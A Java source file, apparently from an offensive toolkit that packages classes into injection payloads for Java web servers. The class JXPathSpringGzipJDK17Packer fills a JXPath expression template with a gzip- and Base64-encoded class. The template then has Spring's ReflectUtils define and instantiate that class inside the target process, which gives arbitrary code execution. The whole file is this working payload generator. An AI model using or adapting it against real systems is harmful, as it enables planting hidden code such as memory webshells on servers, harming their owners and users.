package com.reajason.javaweb.packer.jxpath;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Packers;

import static com.reajason.javaweb.packer.spel.SpELSpringGzipJDK17Packer.assertClassNameValid;

/**
 * @author ReaJason
 * @since 2024/12/13
 */
public class JXPathSpringGzipJDK17Packer implements Packer {
    String template = "newInstance(org.springframework.cglib.core.ReflectUtils.defineClass('{{className}}',org.springframework.util.StreamUtils.copyToByteArray(java.util.zip.GZIPInputStream.new(java.io.ByteArrayInputStream.new(org.springframework.util.Base64Utils.decodeFromString('{{base64Str}}')))),getContextClassLoader(java.lang.Thread.currentThread()),getProtectionDomain(java.lang.Class.forName('org.springframework.expression.ExpressionParser')),java.lang.Class.forName('org.springframework.expression.ExpressionParser')))";

    @Override
    public String pack(ClassPackerConfig config) {
        String className = config.getClassName();
        assertClassNameValid(className);
        return template.replace("{{className}}", className)
                .replace("{{base64Str}}", Packers.GzipBase64.getInstance().pack(config));
    }
}
